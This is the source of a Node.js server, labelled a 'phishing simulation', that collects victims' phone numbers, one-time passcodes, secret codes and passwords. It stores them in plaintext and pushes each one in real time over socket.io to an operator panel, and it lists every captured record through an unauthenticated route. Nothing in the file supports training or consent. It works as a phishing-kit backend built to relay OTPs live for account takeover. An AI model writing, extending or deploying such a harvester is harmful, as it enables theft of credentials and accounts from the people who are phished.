const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const dotenv = require('dotenv');
const mysql = require('mysql2/promise');
const { v4: uuidv4 } = require('uuid');

dotenv.config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());
app.use(express.json());

// MySQL configuration
const dbConfig = {
  host: process.env.DB_HOST || 'localhost',
  user: process.env.DB_USER || 'root',
  password: process.env.DB_PASSWORD || '',
  database: process.env.DB_NAME || 'phishing_simulation',
  port: process.env.DB_PORT || 3306
};

// Create MySQL connection pool
const pool = mysql.createPool(dbConfig);

// Initialize database table
async function initDatabase() {
  try {
    const connection = await pool.getConnection();
    await connection.query(`
      CREATE TABLE IF NOT EXISTS sessions (
        id VARCHAR(36) PRIMARY KEY,
        phone_number VARCHAR(20),
        otp VARCHAR(10),
        secret_code VARCHAR(10),
        password VARCHAR(255),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
      )
    `);
    connection.release();
    console.log('Database initialized successfully');
  } catch (error) {
    console.error('Error initializing database:', error);
  }
}

initDatabase();

// Store active sessions in memory (for real-time updates)
const activeSessions = new Map();

// API Routes

// Create a new simulation session
app.post('/api/session', async (req, res) => {
  try {
    const sessionId = uuidv4();
    await pool.query(
      'INSERT INTO sessions (id) VALUES (?)',
      [sessionId]
    );
    res.json({ sessionId: sessionId });
  } catch (error) {
    console.error('Error creating session:', error);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

// Submit phone number
app.post('/api/phone', async (req, res) => {
  try {
    const { sessionId, phoneNumber } = req.body;

    if (!sessionId || !phoneNumber) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Always create a new session with a new UUID when phone is submitted
    const newSessionId = uuidv4();
    await pool.query(
      'INSERT INTO sessions (id, phone_number) VALUES (?, ?)',
      [newSessionId, phoneNumber]
    );
    console.log('Created new session with phone:', newSessionId);

    // Emit real-time update to admin
    io.emit('session_update', {
      sessionId: newSessionId,
      type: 'phone',
      data: phoneNumber
    });

    res.json({ success: true, sessionId: newSessionId });
  } catch (error) {
    console.error('Error submitting phone:', error);
    res.status(500).json({ error: 'Failed to submit phone number' });
  }
});

// Submit OTP
app.post('/api/otp', async (req, res) => {
  try {
    const { sessionId, otp } = req.body;

    if (!sessionId || !otp) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Update in MySQL
    await pool.query(
      'UPDATE sessions SET otp = ? WHERE id = ?',
      [otp, sessionId]
    );

    // Update in memory for real-time
    activeSessions.set(sessionId, {
      ...activeSessions.get(sessionId),
      otp: otp
    });

    // Emit real-time update to admin
    io.emit('session_update', {
      sessionId,
      type: 'otp',
      data: otp
    });

    res.json({ success: true });
  } catch (error) {
    console.error('Error submitting OTP:', error);
    res.status(500).json({ error: 'Failed to submit OTP' });
  }
});

// Submit secret code
app.post('/api/secret-code', async (req, res) => {
  try {
    const { sessionId, secretCode } = req.body;

    if (!sessionId || !secretCode) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Update in MySQL
    await pool.query(
      'UPDATE sessions SET secret_code = ? WHERE id = ?',
      [secretCode, sessionId]
    );

    // Update in memory for real-time
    activeSessions.set(sessionId, {
      ...activeSessions.get(sessionId),
      secret_code: secretCode
    });

    // Emit real-time update to admin
    io.emit('session_update', {
      sessionId,
      type: 'secret_code',
      data: secretCode
    });

    res.json({ success: true });
  } catch (error) {
    console.error('Error submitting secret code:', error);
    res.status(500).json({ error: 'Failed to submit secret code' });
  }
});

// Submit password
app.post('/api/password', async (req, res) => {
  try {
    const { sessionId, password } = req.body;

    if (!sessionId || !password) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Update in MySQL
    await pool.query(
      'UPDATE sessions SET password = ? WHERE id = ?',
      [password, sessionId]
    );

    // Update in memory for real-time
    activeSessions.set(sessionId, {
      ...activeSessions.get(sessionId),
      password: password
    });

    // Emit real-time update to admin
    io.emit('session_update', {
      sessionId,
      type: 'password',
      data: password
    });

    res.json({ success: true });
  } catch (error) {
    console.error('Error submitting password:', error);
    res.status(500).json({ error: 'Failed to submit password' });
  }
});

// Get all sessions for admin
app.get('/api/sessions', async (req, res) => {
  try {
    const [rows] = await pool.query(
      'SELECT * FROM sessions ORDER BY created_at DESC'
    );
    res.json(rows);
  } catch (error) {
    console.error('Error fetching sessions:', error);
    res.status(500).json({ error: 'Failed to fetch sessions' });
  }
});

// WebSocket connection
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  socket.on('join_admin', () => {
    socket.join('admin');
    console.log('Admin joined');
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
